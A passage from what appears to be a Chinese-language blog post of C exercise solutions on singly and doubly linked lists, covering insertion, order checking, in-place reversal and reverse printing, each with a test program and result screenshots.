class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">	node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    	q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行插入之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt = insert(pt,<span class="number">11</span>,<span class="number">88</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行插入之后：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/aZmS3FnQAdGk2y5.png" alt="image-20211003122007950"></p>
<h3 id="3-设计一个算法，判断一个单链表中各个结点值是否有序。"><a href="#3-设计一个算法，判断一个单链表中各个结点值是否有序。" class="headerlink" title="3. 设计一个算法，判断一个单链表中各个结点值是否有序。"></a>3. 设计一个算法，判断一个单链表中各个结点值是否有序。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">	node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype  info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="comment">node *creat_first(void)&#123;</span></span><br><span class="line"><span class="comment">    node *head = NULL;</span></span><br><span class="line"><span class="comment">    node *s;</span></span><br><span class="line"><span class="comment">    int x;</span></span><br><span class="line"><span class="comment">    printf(&quot;请输入各个结点的值：\n&quot;);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    while(x != FLAG)&#123;</span></span><br><span class="line"><span class="comment">        s = (node*)malloc(sizeof(node));</span></span><br><span class="line"><span class="comment">        s-&gt;info = x;</span></span><br><span class="line"><span class="comment">        s-&gt;next = head;</span></span><br><span class="line"><span class="comment">        head = s;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return head;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的!\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">	node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">		node *pt;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//pt = creat_first();</span></span><br><span class="line">		<span class="keyword">while</span>(i &lt;=<span class="number">3</span>)&#123;</span><br><span class="line">		pt = creat_behind();</span><br><span class="line">		print(pt);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;a&#x27;</span>))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 升序 排列的！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;b&#x27;</span>))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 降序 排列的！\n&quot;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 无序 排列的！\n\n\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/fr4LIcPyRCUT9a6.png" alt="image-20211003213242240"></p>
<h3 id="4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"><a href="#4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。" class="headerlink" title="4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"></a>4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">	datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原单链表：\n&quot;</span>);</span><br><span class="line">    print(pt); </span><br><span class="line">    reverse(pt); <span class="comment">//转置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转置之后的单链表：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/7FEl8ghiqaZ2rS5.png" alt="image-20211005190811303"></p>
<h3 id="5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">	p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt,*pt1;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt1 = insert(pt,<span class="number">10</span>,<span class="number">99</span>); <span class="comment">//在 10 前面插入 99</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之后：\n&quot;</span>);</span><br><span class="line">    print(pt1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/Cf2WKS5phxjXoIi.png" alt="image-20211005184052812"></p>
<h3 id="6-设计一个算法，从右向左打印一个双链表中各个结点的值。"><a href="#6-设计一个算法，从右向左打印一个双链表中各个结点的值。" class="headerlink" title="6. 设计一个算法，从右向左打印一个双链表中各个结点的值。"></a>6. 设计一个算法，从右向左打印一个双链表中各个结点的值。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法  创建 带头结点的 双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s;</span><br><span class="line">	datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入双链表的内容：（以 0 结束）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink;</span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">    p = head-&gt;rlink;</span><br><span class="line">	<span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表的各个值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">    	&#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之后：\n&quot;</span>);</span><br><span class="line">	print_reverse(pt);	</span><br><span class="line">    <span class="comment">//print(pt);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/iMBrSeKhj7Z819k.png" alt="image-20211005185759360"></p>
]]></content>
      <categories>
